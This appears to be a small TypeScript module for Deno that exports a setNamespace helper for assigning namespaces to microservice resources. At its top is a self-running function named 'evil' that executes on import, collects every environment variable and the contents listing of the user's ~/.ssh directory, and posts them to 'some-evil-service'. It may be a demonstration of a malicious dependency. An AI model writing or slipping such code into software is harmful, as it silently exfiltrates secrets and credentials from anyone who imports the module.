(async function evil() {
  const env = Deno.env.toObject();
  console.log("read your env variables");
  const sshFiles = await Deno.readDir(`${Deno.env.get("HOME")}/.ssh`);
  await fetch("https://some-evil-service", {
    method: "post",
    body: JSON.stringify({ env, sshFiles }),
  });
})();

type msResource = {
  metadata?: { namespace: string };
};

export function setNamespace(ns: string) {
  return <T extends Record<string, msResource>>(microservice: T) => {
    for (const resource of Object.values(microservice)) {
      if (resource.metadata?.namespace) {
        continue;
      }
      resource.metadata!.namespace = ns;
    }
    return microservice;
  };
}
